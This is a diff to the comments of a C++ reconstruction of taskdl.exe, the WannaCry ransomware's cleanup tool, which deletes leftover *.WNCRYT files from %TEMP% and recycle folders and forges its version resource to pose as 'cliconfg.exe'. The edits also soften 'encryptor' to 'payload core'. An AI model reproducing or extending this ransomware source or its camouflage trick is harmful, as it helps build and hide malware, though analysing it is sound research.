@@ -1,20 +1,11 @@
-// ============================================================================
-// taskdl.cpp — WannaCry staging-cleaner reconstruction (original taskdl.exe)
-// ============================================================================
-
-// ROLE — cleanup, not download. Despite the historical "downloader" name,
-// this component contains no networking code at all. It performs a single,
-// one-shot sweep of the fixed drives from Z: down to C: and deletes every
-// *.WNCRYT file it finds. .WNCRYT is the intermediate rename state the
-// WannaCry encryptor leaves behind while encrypting a file (original ->
-// .WNCRYT -> encrypted .WNCRY), so anything still carrying that extension
-// is a leftover of an interrupted pass. This sweep erases the staging
-// leftovers and exits; it writes nothing, installs nothing, runs once.
-//
-// CAMOUFLAGE — the binary's version resource is forged to claim it is
-// "cliconfg.exe", the Microsoft SQL Client Configuration Utility, so a
-// casual look at file properties or process listings sees boring, expected
-// system software instead of ransomware tooling.
+// taskdl.cpp — the WannaCry staging-cleaner (taskdl.exe)
+// One-shot sweep of the local drives Z: down to C: deleting every *.WNCRYT
+// file — the intermediate rename state the payload core leaves behind during
+// an interrupted pass (original -> .WNCRYT -> encrypted .WNCRY). Cleanup
+// only: no networking despite the historical "downloader" name, and the
+// version resource is forged to "cliconfg.exe" (Microsoft SQL Client
+// Configuration Utility) as camouflage.
+// Reconstructed from the 2017 WannaCry binary (educational).
 
 #include <windows.h>
 #include <stddef.h>
@@ -258,7 +249,7 @@ static void vector_insert(WStringVector *v, VC6wstring *where, size_t count,
 
 // ---------------------------------------------------------------------------
 // BuildScanBasePath — choose where the *.WNCRYT sweep looks on one drive:
-//   - the drive holding the Windows directory -> %TEMP% (the encryptor's
+//   - the drive holding the Windows directory -> %TEMP% (the payload core's
 //     working directory; trailing '\' stripped so paths join cleanly)
 //   - any other drive                         -> its "X:\$RECYCLE" folder
 // ---------------------------------------------------------------------------
@@ -283,7 +274,7 @@ static wchar_t *BuildScanBasePath(int driveIdx, wchar_t *out)
 // DeleteWnCrytFiles — one drive's sweep.
 //
 // Enumerates every file matching "<base>\*.WNCRYT". FindFirstFile/FindNext
-// match files regardless of their attributes, so entries the encryptor
+// match files regardless of their attributes, so entries the payload core
 // marked hidden or system are still collected. Each hit is recorded as a
 // full path, the search handle is closed, then the collected paths are
 // deleted one by one. Returns the count of successful deletions (WinMain
